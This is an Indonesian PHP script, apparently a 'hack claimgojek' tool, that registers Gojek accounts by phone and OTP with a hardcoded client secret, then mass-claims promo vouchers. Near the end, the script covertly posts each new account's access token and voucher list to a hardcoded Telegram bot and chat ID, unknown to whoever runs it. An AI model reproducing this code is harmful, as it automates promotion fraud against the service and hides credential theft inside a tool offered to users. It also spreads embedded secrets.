<?php
date_default_timezone_set('Asia/Jakarta');
include "function.php";
echo color("yellow"," ===========================\n");
echo color("blue","   by : Gojek.https..|\n");
echo color("green"," beksbhale|\n");
echo color("white"," $$$$$$$$$$$$$$$$$$$$$$$$$$$$\n");
echo color("blue","  >>>>>>>>>>>>>>>>>>>>>>>>>>>>\n");
echo color("red","   by :hack claimgojek|\n");
echo "| Version :3.47.2    |\n";
echo "| Time    :".date('[d-m-Y] [H:i:s]')."   |\n";
// function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        ulang:
        echo color("nevy","(•) Nomor : ");
        $no = trim(fgets(STDIN));
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("green","+] Kode verifikasi sudah di kirim")."\n";
        otp:
        echo color("nevy","?] Otp: ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("green","+] Berhasil mendaftar");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo "\n".color("nevy","?] Mau Redeem Voucher?: y/n ");
        $pilihan = trim(fgets(STDIN));
        if($pilihan == "y" || $pilihan == "Y"){
        echo "\n".color("yellow","!] Claim voc GORIDE");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGORIDE"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","+] Message: ".$message);
        goto goride1;
        }else{
        echo "\n".color("red","-] Message: ".$message);
        goride1:
        echo "\n".color("yellow","!] Claim voc GOFOOD");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $boba10 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOOD022620A"}');
        $messageboba10 = fetch_value($boba10,'"message":"','"');
        if(strpos($boba10, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","+] Message: ".$messageboba10);
        goto goride;
        }else{
        echo "\n".color("red","-] Message: ".$messageboba10);
        echo "\n".color("yellow","!] Claim voc GOFOOD");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $boba19 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOOD022620A"}');
        $messageboba19 = fetch_value($boba19,'"message":"','"');
        if(strpos($boba19, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","+] Message: ".$messageboba19);
        goto goride;
        }else{
        echo "\n".color("red","-] Message: ".$messageboba19);
        goride:
        echo "\n".color("yellow","!] Claim voc GOCAR");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOCAR"}');
        $message1 = fetch_value($goride,'"message":"','"');
        echo "\n".color("green","+] Message: ".$message1);
        echo "\n".color("yellow","!] Claim voc XXI");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $goride1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOPAYDIXXI5"}');
        $message2 = fetch_value($goride1,'"message":"','"');
        echo "\n".color("green","+] Message: ".$message1);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=15&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
        $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
        $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
        $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
        $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
        $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
        echo "\n".color("yellow","!] Total voucher ".$total." : ");
        echo "\n".color("green","1.".$voucher1);
        echo "\n".color("green","2.".$voucher2);
        echo "\n".color("green","3.".$voucher3);
        echo "\n".color("green","4.".$voucher4);
        echo "\n".color("green","5.".$voucher5);
        echo "\n".color("green","6.".$voucher6);
        echo "\n".color("green","7.".$voucher7);
        echo "\n".color("green","8.".$voucher8);
        echo "\n".color("green","9.".$voucher9);
        echo "\n".color("green","10.".$voucher10);
        echo "\n".color("green","11.".$voucher11);
        echo "\n".color("green","12.".$voucher12);    
        echo"\n";
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
        $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
	$chatid = "785784404";
	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
	$method	= "sendMessage";
	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
	$post = [
 		'chat_id' => $chatid,
                'text' => $pesan
        	];
                $header = [
                "X-Requested-With: XMLHttpRequest",
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
        
         
         }
         }
        }
         }else{
            echo color("red","-] Otp yang anda input salah");
            echo"\n==================================\n\n";
            echo color("yellow","!] Silahkan input kembali\n");
            goto otp;
            }
         }else{
         echo color("red","-] Nomor sudah teregistrasi");
         echo"\n==================================\n\n";
         echo color("yellow","!] Silahkan registrasi kembali\n");
         goto ulang;
         }
//  }

// echo change()."\n";
